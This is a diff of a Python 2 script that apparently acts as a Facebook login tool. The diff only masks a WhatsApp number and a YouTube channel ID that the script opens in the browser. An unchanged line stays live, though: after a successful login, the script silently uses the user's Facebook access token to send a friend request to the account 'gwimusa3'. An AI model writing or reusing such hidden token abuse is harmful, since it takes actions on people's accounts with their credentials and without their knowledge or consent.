@@ -5,7 +5,7 @@ print '\x1b[1;32mSilahkan Login '
 import os, sys
 
 def wa():
-    os.system('xdg-open https://api.whatsapp.com/send?phone=6285778417087&text=Assalamualaikum')
+    os.system('xdg-open https://api.whatsapp.com/send?phone=6285778xxxx&text=Assalamualaikum')
 
 
 def restart():
@@ -129,7 +129,7 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://www.youtube.com/channel/UCrK_ngunrK33sd7svsuYsuQ')
+                os.system('xdg-open https://www.youtube.com/channel/XXXXXXXXXXXX')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
